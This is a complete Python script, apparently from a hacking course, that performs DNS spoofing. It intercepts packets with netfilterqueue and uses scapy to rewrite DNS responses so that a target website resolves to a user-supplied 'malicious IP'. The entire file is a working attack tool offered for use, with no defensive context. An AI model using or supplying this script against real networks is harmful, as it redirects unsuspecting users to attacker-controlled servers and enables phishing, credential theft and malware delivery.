#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import optparse

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-w", "--website", dest="website", help="Target website to spoof (e.g., www.bing.com)")
    parser.add_option("-m", "--malip", dest="malicious_ip", help="Malicious IP to redirect the target website to")
    (options, arguments) = parser.parse_args()

    if not options.website:
        parser.error("[-] Please specify a target website, use --help for more info.")
    if not options.malicious_ip:
        parser.error("[-] Please specify a malicious IP, use --help for more info.")

    return options

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if options.website in qname:
            print("[+] Spoofing target: " + options.website)
            answer = scapy.DNSRR(rrname=qname, rdata=options.malicious_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))

    packet.accept()


options = get_arguments()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
